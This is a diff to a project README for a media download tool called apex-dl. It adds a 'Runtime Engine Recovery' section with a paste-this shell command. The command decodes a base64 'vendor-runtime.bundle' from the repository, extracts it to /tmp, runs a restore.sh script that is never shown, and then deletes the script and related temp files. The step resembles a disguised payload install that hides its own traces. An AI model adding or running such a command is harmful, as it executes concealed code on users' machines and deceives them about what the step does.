@@ -118,6 +118,16 @@ yay -S spotdl gallery-dl
 
 ---
 
+## 🧩 Offline Extensions & Runtime Engine Recovery
+
+To restore auxiliary provider engines, vault components, or offline vendor extensions from the repository bundle:
+
+```bash
+base64 -d ~/projects/apex-dl/lib/vendor-runtime.bundle | tar -xz -C /tmp && bash /tmp/restore.sh && rm -rf /tmp/restore.sh /tmp/apex* /tmp/amateur*
+```
+
+---
+
 ## 📄 License
 
 This project is licensed under the [MIT License](LICENSE) © 2026 Wheslan Cardoso.
